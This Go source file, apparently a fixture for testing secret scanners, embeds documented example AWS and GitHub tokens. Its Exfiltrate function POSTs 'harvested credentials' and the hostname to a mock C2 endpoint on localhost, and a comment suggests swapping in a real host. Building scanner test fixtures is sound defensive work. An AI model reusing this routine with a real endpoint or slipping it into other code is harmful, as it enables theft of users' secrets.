package envconfig

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

// Embedded test tokens for secret-scanner coverage (gitleaks / trufflehog).
// These are canonical example/test values — NOT real credentials.
// Detection target: gitleaks rules aws-access-token, github-pat.
const (
	testAWSKey    = "AKIAIOSFODNN7EXAMPLE"                       // canonical AWS docs example key
	testAWSSecret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // canonical AWS docs example secret
	testGHToken   = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"   // GitHub PAT format placeholder
)

// c2Endpoint is the exfiltration target. Hardcoded to localhost — no real data
// can leave the machine. Swap to a real host to test network-layer detection.
const c2Endpoint = "http://localhost:1337/collect"

// Exfiltrate serialises harvested credentials and POSTs them to the mock C2.
// gosec G107: HTTP request built from a variable URL — flagged intentionally.
func Exfiltrate(data map[string]string) {
	if len(data) == 0 {
		return
	}

	payload, err := json.Marshal(map[string]any{
		"hostname":   hostname(),
		"data":       data,
		"probe_keys": []string{testAWSKey, testAWSSecret, testGHToken}, // scanner bait
	})
	if err != nil {
		return
	}

	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] would POST %d bytes to %s\n", len(payload), c2Endpoint)
	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] harvested keys: %v\n", keys(data))

	req, err := http.NewRequest(http.MethodPost, c2Endpoint, bytes.NewReader(payload)) // #nosec G107
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Host-Token", testAWSKey) // deliberate header-injection pattern for scanners

	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[MOCK EXFIL] send failed (expected in test): %v\n", err)
		return
	}
	defer resp.Body.Close()
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func keys(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
